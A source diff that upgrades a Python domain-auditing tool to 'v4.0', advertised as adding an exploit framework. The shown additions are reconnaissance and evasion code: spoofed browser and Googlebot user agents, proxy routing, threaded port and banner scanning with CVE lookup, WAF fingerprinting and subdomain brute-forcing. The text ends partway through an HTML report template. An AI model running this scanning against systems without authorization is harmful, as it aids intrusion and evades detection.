@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-WebGate  —  Domain Security Auditor
+WebGate v4.0 —  Domain Security Auditor + Network Agent + Exploit Framework
 Created by c3less  |  https://github.com/c3less/webgate
 Telegram: @c3less
 
 CLI:   python webgate.py
 GUI:   python webgate.py --gui
 Quick: python webgate.py -d example.com
+Agent: python webgate.py agent
+Exploit: python webgate.py exploit <domain>
 """
 
 # ═══════════════════════════════════════════════════════════════
@@ -15,9 +17,11 @@ Quick: python webgate.py -d example.com
 # ═══════════════════════════════════════════════════════════════
 import sys, os, re, time, socket, ssl, json, threading, argparse
 import subprocess, struct, wave, io, math, tempfile, atexit, sqlite3
+import ipaddress, random, hashlib, base64, string
 from datetime import datetime
 from urllib.request import urlopen, Request
 from urllib.error import URLError, HTTPError
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Force X11 for transparency support on Linux/Wayland
 if sys.platform.startswith("linux"):
@@ -30,6 +34,15 @@ except ImportError:        WHOIS_OK = False
 try:
     import dns.resolver, dns.exception; DNS_OK = True
 except ImportError:        DNS_OK = False
+try:
+    import requests;       REQUESTS_OK = True
+except ImportError:        REQUESTS_OK = False
+try:
+    import netifaces;      NETIFACES_OK = True
+except ImportError:        NETIFACES_OK = False
+try:
+    import paramiko;       PARAMIKO_OK = True
+except ImportError:        PARAMIKO_OK = False
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -378,9 +391,23 @@ THEMES = {
     "LOG_CLR": {"INFO":"#006600","FOUND":"#00cc00","WARN":"#ffaa00",
                 "ERROR":"#ff2200","STEP":"#00ff88","SUCCESS":"#00ffcc"},
 },
+# Pure black & white — zero color, only grayscale
+"mono": {
+    "BG":      "#000000", "BG2":    "#0a0a0a", "BG3":    "#111111",
+    "BG4":     "#1a1a1a", "BORDER": "#2a2a2a", "BORDER2":"#444444",
+    "BORDER3": "#888888", "FG":     "#e0e0e0", "FG2":    "#aaaaaa",
+    "FG3":     "#555555", "WHITE":  "#ffffff", "OFFWHT": "#dddddd",
+    "BTN_BG":  "#ffffff", "BTN_FG": "#000000", "BTN_HOV":"#dddddd",
+    "BTN_DIS_BG":"#1a1a1a","BTN_DIS_FG":"#444444",
+    "LOGO_CLR":"#ffffff", "LOGO_SHD":"#1a1a1a",
+    "ACC":     "#ffffff", "ACC2":   "#aaaaaa", "ACC3":   "#888888",
+    "WARN":    "#cccccc", "ERR":    "#ffffff",
+    "LOG_CLR": {"INFO":"#555555","FOUND":"#e0e0e0","WARN":"#aaaaaa",
+                "ERROR":"#ffffff","STEP":"#cccccc","SUCCESS":"#ffffff"},
+},
 }
 
-THEME_ORDER = ["dark", "light", "midnight", "hacker", "custom"]
+THEME_ORDER = ["dark", "mono", "light", "midnight", "hacker", "custom"]
 
 def get_theme() -> dict:
     name = SETTINGS.get("theme", "dark")
@@ -393,20 +420,51 @@ def get_theme() -> dict:
 # ═══════════════════════════════════════════════════════════════
 # SOUND
 # ═══════════════════════════════════════════════════════════════
-_CLICK_FILE = ""
+_CLICK_FILE  = ""
 _last_sound  = 0.0
+_SOUND_CMD   = []   # will be detected once
+
+def _detect_audio_cmd():
+    """Find first working audio player on this system."""
+    global _SOUND_CMD
+    if sys.platform == "darwin":
+        _SOUND_CMD = ["afplay"]; return
+    # Linux: try in order of preference
+    candidates = [
+        ["pw-play"],            # PipeWire native
+        ["paplay"],             # PulseAudio
+        ["aplay", "-q"],        # ALSA
+        ["mpv", "--really-quiet", "--no-video"],   # mpv
+        ["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet"],
+        ["cvlc", "--play-and-exit", "--quiet"],
+        ["sox", "--null", "--null"],  # sox (will fail but safe)
+    ]
+    for cmd in candidates:
+        try:
+            if subprocess.run(["which", cmd[0]],
+                    capture_output=True, timeout=2).returncode == 0:
+                _SOUND_CMD = cmd; return
+        except Exception:
+            continue
 
 def _init_sound():
     global _CLICK_FILE
+    _detect_audio_cmd()
     try:
-        sr, n = 22050, int(22050 * 0.018)
-        buf = io.BytesIO()
+        sr   = 22050
+        dur  = 0.022          # 22 ms — longer = louder
+        n    = int(sr * dur)
+        buf  = io.BytesIO()
         with wave.open(buf, 'wb') as w:
             w.setnchannels(1); w.setsampwidth(2); w.setframerate(sr)
             frames = []
             for i in range(n):
                 t_ = i / sr
-                amp = int(4200 * (1 - t_ / 0.018) * math.sin(2 * math.pi * 2400 * t_))
+                # Two-tone click: sharp 3kHz + soft 1.2kHz body
+                env  = (1 - t_ / dur) ** 1.5
+                tone = (math.sin(2 * math.pi * 3000 * t_) * 0.6 +
+                        math.sin(2 * math.pi * 1200 * t_) * 0.4)
+                amp  = int(28000 * env * tone)
                 frames.append(struct.pack('<h', max(-32767, min(32767, amp))))
             w.writeframes(b''.join(frames))
         fd, path = tempfile.mkstemp(suffix='.wav')
@@ -419,18 +477,16 @@ def _init_sound():
 
 def play_click():
     global _last_sound
-    if not SETTINGS.get("sound") or not _CLICK_FILE:
+    if not SETTINGS.get("sound") or not _CLICK_FILE or not _SOUND_CMD:
         return
     now = time.time()
-    if now - _last_sound < 0.035:
+    if now - _last_sound < 0.04:
         return
     _last_sound = now
     try:
-        if sys.platform.startswith("linux"):
-            subprocess.Popen(["aplay", "-q", _CLICK_FILE],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        elif sys.platform == "darwin":
-            subprocess.Popen(["afplay", _CLICK_FILE])
+        subprocess.Popen(_SOUND_CMD + [_CLICK_FILE],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            start_new_session=True)
     except Exception:
         pass
 
@@ -474,15 +530,52 @@ BANNER = f"""\
 ╚███╔███╔╝███████╗██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗
  ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
 {C.RST}{C.DIM}
-  ┌─────────────────────────────────────────────────────────┐
-  │  Domain Security Auditor  │  v3.0  │  by c3less          │
-  │  DNS · WHOIS · SSL · Ports · CVE · DeepScan · 30 Tools  │
-  └─────────────────────────────────────────────────────────┘
+  ┌──────────────────────────────────────────────────────────────┐
+  │  Domain Security Auditor  │  v4.0  │  by c3less               │
+  │  DNS · WHOIS · SSL · Ports · CVE · Agent · Exploit · 40 Tools │
+  └──────────────────────────────────────────────────────────────┘
 {C.RST}"""
 
 
 # ═══════════════════════════════════════════════════════════════
-# CVE DATABASE — 200+ entries
+# USER-AGENT ROTATION & PROXY
+# ═══════════════════════════════════════════════════════════════
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+]
+
+def random_ua() -> str:
+    return random.choice(USER_AGENTS)
+
+_PROXY_CONFIG = {"http": None, "https": None}
+
+def set_proxy(proxy_url: str):
+    """Set HTTP/SOCKS proxy. Format: http://host:port or socks5://host:port"""
+    _PROXY_CONFIG["http"] = proxy_url
+    _PROXY_CONFIG["https"] = proxy_url
+
+def get_proxy_handler():
+    """Return urllib proxy handler if proxy is configured."""
+    if _PROXY_CONFIG["http"]:
+        from urllib.request import ProxyHandler
+        return ProxyHandler({
+            "http": _PROXY_CONFIG["http"],
+            "https": _PROXY_CONFIG["https"],
+        })
+    return None
+
+
+# ═══════════════════════════════════════════════════════════════
+# CVE DATABASE — 200+ entries with CVSS scores
 # ═══════════════════════════════════════════════════════════════
 _CVE_DB_PATH = os.path.join(_SCRIPT_DIR, "cve.db")
 
@@ -681,6 +774,77 @@ CVE_DATA = [
     ("http","CVE-2022-41040","ProxyNotShell — SSRF + RCE CVSS 8.8"),
     ("http","CVE-2022-41082","ProxyNotShell PowerShell RCE — CVSS 8.8"),
     ("https","CVE-2022-41040","ProxyNotShell — SSRF + RCE CVSS 8.8"),
+    # ── v4.0 additions ──────────────────────────────────────────
+    # MikroTik RouterOS
+    ("mikrotik","CVE-2023-30799","RouterOS RCE via Winbox — CVSS 9.1"),
+    ("mikrotik","CVE-2021-41987","RouterOS heap overflow — CVSS 8.1"),
+    ("mikrotik","CVE-2019-3977","RouterOS DNS cache poisoning — CVSS 7.5"),
+    ("mikrotik","CVE-2018-14847","Winbox arbitrary file read — CVSS 9.1"),
+    # Cisco
+    ("cisco","CVE-2023-20198","IOS XE web UI RCE — CVSS 10.0"),
+    ("cisco","CVE-2023-20273","IOS XE privilege escalation — CVSS 7.2"),
+    ("cisco","CVE-2021-1498","HyperFlex RCE — CVSS 9.8"),
+    # FortiGate
+    ("fortinet","CVE-2023-27997","FortiOS heap overflow — CVSS 9.8 RCE"),
+    ("fortinet","CVE-2022-42475","FortiOS SSL-VPN RCE — CVSS 9.8"),
+    ("fortinet","CVE-2022-40684","FortiOS auth bypass — CVSS 9.8"),
+    # TP-Link
+    ("tp-link","CVE-2023-1389","Archer AX21 command injection — CVSS 8.8"),
+    # Synology
+    ("synology","CVE-2022-27617","Synology NAS path traversal — CVSS 7.5"),
+    ("synology","CVE-2021-29086","Synology DSM arbitrary file read — CVSS 7.5"),
+    # QNAP
+    ("qnap","CVE-2022-27596","QNAP NAS SQL injection — CVSS 9.8"),
+    ("qnap","CVE-2021-28806","QNAP RCE via QTS — CVSS 9.8"),
+    # Cameras
+    ("hikvision","CVE-2021-36260","Hikvision IP camera RCE — CVSS 9.8"),
+    ("dahua","CVE-2021-33044","Dahua auth bypass — CVSS 9.8"),
+    # VNC
+    ("vnc","CVE-2019-8287","TightVNC stack buffer overflow — CVSS 9.8"),
+    ("vnc","CVE-2022-4283","VNC auth bypass via clipboard — CVSS 7.8"),
+    # Grafana expanded
+    ("grafana","CVE-2023-3128","Grafana auth bypass — CVSS 9.4"),
+    ("grafana","CVE-2023-22462","Grafana stored XSS — CVSS 7.1"),
+    # GitLab expanded
+    ("gitlab","CVE-2023-2825","Path traversal — CVSS 10.0"),
+    ("gitlab","CVE-2023-7028","Account takeover via email — CVSS 10.0"),
+    # Confluence
+    ("confluence","CVE-2023-22515","Broken access control — CVSS 10.0"),
+    ("confluence","CVE-2022-26134","OGNL injection RCE — CVSS 9.8"),
+    ("confluence","CVE-2021-26084","OGNL injection RCE — CVSS 9.8"),
+    # Exchange / ProxyShell
+    ("exchange","CVE-2021-34473","ProxyShell pre-auth RCE — CVSS 9.8"),
+    ("exchange","CVE-2021-34523","ProxyShell elevation — CVSS 9.8"),
+    ("exchange","CVE-2021-31207","ProxyShell post-auth RCE — CVSS 7.2"),
+    ("exchange","CVE-2021-26855","ProxyLogon SSRF — CVSS 9.8"),
+    # Log4j expanded
+    ("log4j","CVE-2021-44228","Log4Shell JNDI injection — CVSS 10.0"),
+    ("log4j","CVE-2021-45046","Log4j DoS + RCE bypass — CVSS 9.0"),
+    ("log4j","CVE-2021-45105","Log4j recursive lookup DoS — CVSS 5.9"),
+    # Elasticsearch expanded
+    ("elasticsearch","CVE-2023-31580","Elasticsearch SSRF — CVSS 6.5"),
+    ("elasticsearch","CVE-2022-23708","Elasticsearch priv escalation — CVSS 8.8"),
+    # RabbitMQ
+    ("rabbitmq","CVE-2022-37026","Erlang auth bypass — CVSS 9.8"),
+    # Consul
+    ("consul","CVE-2023-1297","Consul cross-namespace ACL bypass — CVSS 8.1"),
+    # Vault
+    ("vault","CVE-2023-24999","Vault PKI revocation bypass — CVSS 6.5"),
+    # pfSense
+    ("pfsense","CVE-2022-31814","pfSense RCE via pfBlocker — CVSS 9.8"),
+    ("pfsense","CVE-2021-41282","pfSense command injection — CVSS 8.8"),
+    # OpenWrt
+    ("openwrt","CVE-2020-7982","OpenWrt package injection — CVSS 8.1"),
+    # Zyxel
+    ("zyxel","CVE-2022-30525","Zyxel firewall OS command injection — CVSS 9.8"),
+    ("zyxel","CVE-2023-28771","Zyxel IKE command injection — CVSS 9.8"),
+    # Webmin
+    ("webmin","CVE-2019-15107","Webmin RCE via password_change — CVSS 9.8"),
+    ("webmin","CVE-2022-0824","Webmin arbitrary file access — CVSS 9.8"),
+    # MinIO
+    ("minio","CVE-2023-28432","MinIO env var information disclosure — CVSS 7.5"),
+    # Harbor
+    ("harbor","CVE-2022-46463","Harbor unauth image pull — CVSS 7.5"),
 ]
 
 def init_cve_db():
@@ -834,12 +998,21 @@ class DomainScanner:
                     self._log(f"  {lbl:<16} : {str(v)[:62]}", "FOUND")
             exp = sg("expiration_date")
             if exp and hasattr(exp, "date"):
-                days = (exp - datetime.now()).days
-                r["days_until_expiry"] = days
-                if   days < 0:  self._log(f"  Domain EXPIRED {abs(days)} days ago!", "ERROR")
-                elif days < 30: self._log(f"  Expires in {days} days — URGENT", "WARN")
-                elif days < 90: self._log(f"  Expires in {days} days", "WARN")
-                else:           self._log(f"  Expires in     : {days} days", "INFO")
+                try:
+                    import datetime as _dt_mod
+                    now = datetime.now()
+                    # If exp is timezone-aware, make now timezone-aware too (UTC)
+                    if hasattr(exp, 'tzinfo') and exp.tzinfo is not None:
+                        import datetime as _dtm
+                        now = _dtm.datetime.now(_dtm.timezone.utc)
+                    days = (exp - now).days
+                    r["days_until_expiry"] = days
+                    if   days < 0:  self._log(f"  Domain EXPIRED {abs(days)} days ago!", "ERROR")
+                    elif days < 30: self._log(f"  Expires in {days} days — URGENT", "WARN")
+                    elif days < 90: self._log(f"  Expires in {days} days", "WARN")
+                    else:           self._log(f"  Expires in     : {days} days", "INFO")
+                except Exception:
+                    pass
         except Exception as e:
             r["error"] = str(e)
             self._log(f"  WHOIS failed: {str(e)[:100]}", "ERROR")
@@ -951,17 +1124,16 @@ class DomainScanner:
         self.results["ssl"] = r; self._prog(76)
 
     def scan_ports(self, ask_cb=None):
-        self._log("Scanning common ports...", "STEP"); self._prog(79)
+        self._log("Scanning common ports (threaded)...", "STEP"); self._prog(79)
         r = {"target_ip": None, "open": [], "closed": [], "filtered": []}
         try:    r["target_ip"] = socket.gethostbyname(self.domain)
         except: r["target_ip"] = self.domain
         tgt = r["target_ip"]; total = len(self.PORTS)
-        for i, (port, svc) in enumerate(self.PORTS.items()):
-            if self.cancelled: break
-            if ask_cb:
-                ans = ask_cb(port, svc)
-                if ans == "skip": r["closed"].append(port); continue
-                if ans == "all":  ask_cb = None
+        _lock = threading.Lock()
+        _done = [0]
+
+        def _scan_one(port, svc):
+            if self.cancelled: return
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1.2)
@@ -970,8 +1142,9 @@ class DomainScanner:
                 if res == 0:
                     banner = self._banner(tgt, port)
                     cves   = query_cve(svc.lower())
-                    r["open"].append({"port": port, "service": svc,
-                                      "banner": banner, "cves": cves})
+                    with _lock:
+                        r["open"].append({"port": port, "service": svc,
+                                          "banner": banner, "cves": cves})
                     cve_str = f"  [{len(cves)} CVE]" if cves else ""
                     self._log(
                         f"  {port:5}/tcp  OPEN    {svc:<14}"
@@ -980,12 +1153,38 @@ class DomainScanner:
                     for cve_id, desc in cves[:3]:
                         self._log(f"    ⚡ {cve_id}: {desc[:60]}", "WARN")
                 else:
-                    r["closed"].append(port)
+                    with _lock: r["closed"].append(port)
             except socket.timeout:
-                r["filtered"].append(port)
+                with _lock: r["filtered"].append(port)
             except:
-                r["closed"].append(port)
-            self._prog(79 + int((i + 1) / total * 9))
+                with _lock: r["closed"].append(port)
+            with _lock:
+                _done[0] += 1
+                self._prog(79 + int(_done[0] / total * 9))
+
+        if ask_cb:
+            # Sequential if user wants per-port confirmation
+            for port, svc in self.PORTS.items():
+                if self.cancelled: break
+                ans = ask_cb(port, svc)
+                if ans == "skip": r["closed"].append(port); continue
+                if ans == "all":  ask_cb = None; break
+                _scan_one(port, svc)
+            if not ask_cb:
+                # User said "all" — scan remaining in parallel
+                remaining = {p: s for p, s in self.PORTS.items()
+                             if p not in [x["port"] for x in r["open"]]
+                             and p not in r["closed"] and p not in r["filtered"]}
+                with ThreadPoolExecutor(max_workers=20) as pool:
+                    for port, svc in remaining.items():
+                        pool.submit(_scan_one, port, svc)
+        else:
+            with ThreadPoolExecutor(max_workers=20) as pool:
+                for port, svc in self.PORTS.items():
+                    pool.submit(_scan_one, port, svc)
+
+        # Sort open ports by port number
+        r["open"].sort(key=lambda x: x["port"])
         self._log(f"  Open: {len(r['open'])}  Closed: {len(r['closed'])}  Filtered: {len(r['filtered'])}", "INFO")
         self.results["ports"] = r; self._prog(90)
 
@@ -1000,6 +1199,135 @@ class DomainScanner:
         except:
             return ""
 
+    def detect_waf(self):
+        """Detect WAF/CDN (Cloudflare, Akamai, AWS Shield, Sucuri, etc.)."""
+        self._log("Detecting WAF / CDN...", "STEP")
+        r = {"detected": False, "waf": "None", "indicators": []}
+
+        # Check via HTTP headers
+        for proto in ("https", "http"):
+            try:
+                url = f"{proto}://{self.domain}"
+                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (WebGate/4.0 SecurityAudit)"})
+                with urlopen(req, timeout=8) as resp:
+                    headers = {k.lower(): v for k, v in resp.headers.items()}
+
+                    waf_sigs = [
+                        (["cf-ray", "cf-cache-status"], "server", "cloudflare", "Cloudflare"),
+                        (["x-sucuri-id", "x-sucuri-cache"], "server", "sucuri", "Sucuri WAF"),
+                        (["x-akamai-transformed"], "server", "akamai", "Akamai"),
+                        (["x-amz-cf-id", "x-amz-cf-pop"], "server", "amazo", "AWS CloudFront"),
+                        (["x-cdn"], "server", "incapsula", "Imperva Incapsula"),
+                        ([], "server", "ddos-guard", "DDoS-Guard"),
+                        ([], "server", "yunjiasu", "Baidu Yunjiasu"),
+                        (["x-fw-hash"], "server", "wordfence", "Wordfence"),
+                        ([], "server", "stackpath", "StackPath"),
+                        (["x-fastly-request-id"], "server", "fastly", "Fastly CDN"),
+                        ([], "server", "varnish", "Varnish Cache"),
+                    ]
+
+                    for extra_headers, hdr_key, sig, name in waf_sigs:
+                        found = False
+                        for eh in extra_headers:
+                            if eh in headers:
+                                found = True
+                                r["indicators"].append(f"Header: {eh}")
+                        if sig in headers.get(hdr_key, "").lower():
+                            found = True
+                            r["indicators"].append(f"Server: {headers.get(hdr_key, '')}")
+                        if found:
+                            r["detected"] = True
+                            r["waf"] = name
+                            self._log(f"  WAF detected    : {name}", "WARN")
+                            break
+
+                    # Cookie-based detection
+                    cookies = headers.get("set-cookie", "")
+                    cookie_sigs = {
+                        "__cfduid": "Cloudflare", "sucuri_": "Sucuri",
+                        "incap_ses": "Incapsula", "visid_incap": "Incapsula",
+                        "ak_bmsc": "Akamai", "bm_sz": "Akamai",
+                    }
+                    for csig, cname in cookie_sigs.items():
+                        if csig in cookies.lower():
+                            r["detected"] = True
+                            r["waf"] = cname
+                            r["indicators"].append(f"Cookie: {csig}")
+                            self._log(f"  WAF via cookie  : {cname}", "WARN")
+                            break
+
+                    if not r["detected"]:
+                        self._log("  No WAF detected", "INFO")
+                    break
+            except:
+                continue
+
+        # IP-based Cloudflare check
+        if not r["detected"]:
+            try:
+                ip = socket.gethostbyname(self.domain)
+                cf_prefixes = ["103.21.", "103.22.", "103.31.", "104.16.", "104.17.",
+                               "104.18.", "104.19.", "104.20.", "104.21.", "104.22.",
+                               "104.23.", "104.24.", "104.25.", "104.26.", "104.27.",
+                               "108.162.", "141.101.", "162.158.", "172.64.", "172.65.",
+                               "172.66.", "172.67.", "173.245.", "188.114.", "190.93.",
+                               "197.234.", "198.41."]
+                if any(ip.startswith(p) for p in cf_prefixes):
+                    r["detected"] = True
+                    r["waf"] = "Cloudflare (IP range)"
+                    r["indicators"].append(f"IP {ip} in CF range")
+                    self._log(f"  Cloudflare IP   : {ip}", "WARN")
+            except:
+                pass
+
+        self.results["waf"] = r
+
+    def enumerate_subdomains(self):
+        """Built-in subdomain enumeration via DNS brute + common names."""
+        self._log("Enumerating subdomains...", "STEP")
+        subs_found = []
+        common_subs = [
+            "www", "mail", "ftp", "smtp", "pop", "imap", "webmail",
+            "admin", "panel", "cpanel", "whm", "webdisk", "ns1", "ns2",
+            "dns", "dns1", "dns2", "mx", "mx1", "mx2", "remote",
+            "blog", "shop", "store", "api", "dev", "staging", "test",
+            "beta", "demo", "portal", "vpn", "ssh", "git", "svn",
+            "jenkins", "ci", "cd", "docs", "wiki", "jira", "confluence",
+            "grafana", "monitor", "status", "cdn", "static", "media",
+            "images", "img", "assets", "download", "downloads",
+            "app", "mobile", "m", "old", "new", "v2", "v3",
+            "stage", "uat", "qa", "pre", "prod", "backup",
+            "db", "database", "sql", "mysql", "redis", "mongo",
+            "elastic", "kibana", "prometheus", "sentry",
+            "auth", "sso", "login", "oauth", "id", "accounts",
+            "crm", "erp", "hr", "finance", "intranet", "internal",
+            "s3", "storage", "files", "cloud", "aws", "gcp", "azure",
+        ]
+
+        base = self.domain.split(".")
+        if len(base) > 2:
+            root = ".".join(base[-2:])
+        else:
+            root = self.domain
+
+        _lock = threading.Lock()
+        def _check_sub(sub):
+            if self.cancelled: return
+            full = f"{sub}.{root}"
+            try:
+                ips = socket.gethostbyname(full)
+                with _lock:
+                    subs_found.append({"subdomain": full, "ip": ips})
+                self._log(f"  {full:<32} → {ips}", "FOUND")
+            except:
+                pass
+
+        with ThreadPoolExecutor(max_workers=30) as pool:
+            pool.map(_check_sub, common_subs)
+
+        self._log(f"  Found {len(subs_found)} subdomains", "INFO")
+        self.results["subdomains"] = subs_found
+
     def generate_report(self) -> str:
         self._log("Generating security report...", "STEP"); self._prog(93)
         ts   = datetime.now()
@@ -1010,7 +1338,7 @@ class DomainScanner:
         def rule(c="═"): return c * W
         def sec(s): lines.extend(["", rule("─"), f"  {s}", rule("─")])
 
-        lines += [rule(), "  WEBGATE v3.0 — DOMAIN SECURITY AUDIT REPORT",
+        lines += [rule(), "  WEBGATE v4.0 — DOMAIN SECURITY AUDIT REPORT",
                   "  Created by c3less  │  github.com/c3less/webgate", rule("─"),
                   f"  Target    : {self.domain}",
                   f"  Date/Time : {ts.strftime('%Y-%m-%d %H:%M:%S')}",
@@ -1065,16 +1393,36 @@ class DomainScanner:
         if not p.get("open"):
             lines.append("  No open ports found")
 
-        sec("7. RISK SUMMARY")
+        sec("7. WAF / CDN")
+        waf = self.results.get("waf", {})
+        lines.append(f"  Detected      : {'Yes' if waf.get('detected') else 'No'}")
+        if waf.get("detected"):
+            lines.append(f"  WAF           : {waf.get('waf', 'Unknown')}")
+            for ind in waf.get("indicators", []):
+                lines.append(f"    · {ind}")
+
+        sec("8. SUBDOMAINS")
+        subs = self.results.get("subdomains", [])
+        if subs:
+            for s in subs:
+                lines.append(f"  {s['subdomain']:<32} → {s['ip']}")
+        else:
+            lines.append("  No subdomains enumerated (use 'full' or '--subs' flag)")
+
+        sec("9. RISK SUMMARY")
         risks = self._build_risks()
         if risks:
             for sev, det in risks: lines.append(f"  [{sev:<8}] {det}")
         else:
             lines.append("  [OK] No critical risks found")
 
-        sec("8. SCAN LOG")
+        sec("10. SCAN LOG")
         for ln in self.log_lines: lines.append(f"  {ln}")
-        lines += ["", rule(), "  END OF REPORT — WebGate v3.0 by c3less", rule()]
+        lines += ["", rule(), "  END OF REPORT — WebGate v4.0 by c3less", rule()]
+
+        # Generate HTML report alongside text
+        html_fn = fn.replace(".txt", ".html")
+        self._generate_html_report(lines, html_fn)
 
         try:
             with open(fn, "w", encoding="utf-8") as f:
@@ -1085,6 +1433,124 @@ class DomainScanner:
         self.results["report_file"] = fn
         self._prog(100)
         return fn
+
+    def _generate_html_report(self, text_lines, html_fn):
+        """Generate HTML version of the report."""
+        try:
+            risk_data = self._build_risks()
+            crit = sum(1 for s, _ in risk_data if s == "CRITICAL")
+            high = sum(1 for s, _ in risk_data if s == "HIGH")
+            med  = sum(1 for s, _ in risk_data if s == "MEDIUM")
+            ports = self.results.get("ports", {})
+            open_count = len(ports.get("open", []))
+            waf = self.results.get("waf", {})
+            ssl_info = self.results.get("ssl", {})
+            http_info = self.results.get("http", {})
+            score = http_info.get("score", 0)
+
+            # Build port rows
+            port_rows = ""
+            for po in ports.get("open", []):
+                cve_count = len(po.get("cves", []))
+                cve_badge = f'<span style="color:#ff4757">{cve_count} CVE</span>' if cve_count else ""
+                port_rows += f"<tr><td>{po['port']}</td><td>{po['service']}</td>"
+                port_rows += f"<td>{(po.get('banner','') or '')[:40]}</td><td>{cve_badge}</td></tr>\n"
+
+            # Build risk rows
+            risk_rows = ""
+            for sev, det in risk_data:
+                color = {"CRITICAL":"#ff4757","HIGH":"#ff6b6b","MEDIUM":"#ffa502","LOW":"#2ed573"}.get(sev,"#ccc")
+                risk_rows += f'<tr><td><span style="color:{color};font-weight:bold">{sev}</span></td>'
+                risk_rows += f'<td>{det}</td></tr>\n'
+
+            html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WebGate Report — {self.domain}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:'Courier New',monospace;background:#0a0d14;color:#c8d4e8;padding:20px}}
+.container{{max-width:900px;margin:0 auto}}
+h1{{color:#4a9eff;font-size:24px;margin-bottom:4px}}
+h2{{color:#4a9eff;font-size:16px;margin:20px 0 8px;border-bottom:1px solid #1e2a48;padding-bottom:4px}}
+.subtitle{{color:#8898b8;font-size:12px;margin-bottom:16px}}
+.card{{background:#0f1220;border:1px solid #1e2a48;border-radius:6px;padding:16px;margin:10px 0}}
+.stats{{display:flex;gap:12px;flex-wrap:wrap;margin:12px 0}}
+.stat{{background:#141828;border:1px solid #1e2a48;border-radius:4px;padding:10px 16px;text-align:center;flex:1;min-width:100px}}
+.stat .val{{font-size:22px;font-weight:bold}}
+.stat .lbl{{color:#8898b8;font-size:10px;margin-top:2px}}
+.crit .val{{color:#ff4757}} .high .val{{color:#ff6b6b}} .med .val{{color:#ffa502}} .ok .val{{color:#2ed573}}
+table{{width:100%;border-collapse:collapse;margin:8px 0}}
+th,td{{text-align:left;padding:6px 10px;border-bottom:1px solid #1e2a48;font-size:13px}}
+th{{color:#4a9eff;font-size:11px;text-transform:uppercase}}
+.footer{{color:#3a4868;font-size:11px;text-align:center;margin-top:30px;padding-top:10px;border-top:1px solid #1e2a48}}
+.badge{{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:bold}}
+.badge-waf{{background:#ff650033;color:#ff6500}}
+.badge-ok{{background:#2ed57333;color:#2ed573}}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>WebGate v4.0</h1>
+<div class="subtitle">Domain Security Audit Report &middot; {self.domain} &middot; {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
+
+<div class="stats">
+  <div class="stat crit"><div class="val">{crit}</div><div class="lbl">CRITICAL</div></div>
+  <div class="stat high"><div class="val">{high}</div><div class="lbl">HIGH</div></div>
+  <div class="stat med"><div class="val">{med}</div><div class="lbl">MEDIUM</div></div>
+  <div class="stat"><div class="val">{open_count}</div><div class="lbl">OPEN PORTS</div></div>
+  <div class="stat {'ok' if score >= 5 else 'med' if score >= 3 else 'high'}"><div class="val">{score}/7</div><div class="lbl">SEC HEADERS</div></div>
+  <div class="stat"><div class="val">{'<span class="badge badge-waf">'+waf.get("waf","")+'</span>' if waf.get("detected") else '<span class="badge badge-ok">None</span>'}</div><div class="lbl">WAF</div></div>
+</div>
+
+<h2>Open Ports</h2>
+<div class="card">
+<table>
+<tr><th>Port</th><th>Service</th><th>Banner</th><th>CVEs</th></tr>
+{port_rows if port_rows else '<tr><td colspan="4">No open ports</td></tr>'}
+</table>
+</div>
+
+<h2>Risk Summary</h2>
+<div class="card">
+<table>
+<tr><th>Severity</th><th>Details</th></tr>
+{risk_rows if risk_rows else '<tr><td colspan="2">No risks found</td></tr>'}
+</table>
+</div>
+
+<h2>SSL/TLS</h2>
+<div class="card">
+<table>
+<tr><td>Available</td><td>{'Yes' if ssl_info.get('available') else 'No'}</td></tr>
+<tr><td>Version</td><td>{ssl_info.get('version','N/A')}</td></tr>
+<tr><td>Cipher</td><td>{ssl_info.get('cipher','N/A')}</td></tr>
+<tr><td>Issuer</td><td>{ssl_info.get('issuer','N/A')}</td></tr>
+<tr><td>Expires</td><td>{ssl_info.get('not_after','N/A')}</td></tr>
+<tr><td>Self-signed</td><td>{'Yes' if ssl_info.get('self_signed') else 'No'}</td></tr>
+</table>
+</div>
+
+<h2>HTTP Info</h2>
+<div class="card">
+<table>
+<tr><td>Status</td><td>{http_info.get('status_code','N/A')}</td></tr>
+<tr><td>Server</td><td>{http_info.get('server','Not disclosed')}</td></tr>
+<tr><td>HTTPS Redirect</td><td>{'Yes' if http_info.get('redirects_to_https') else 'No'}</td></tr>
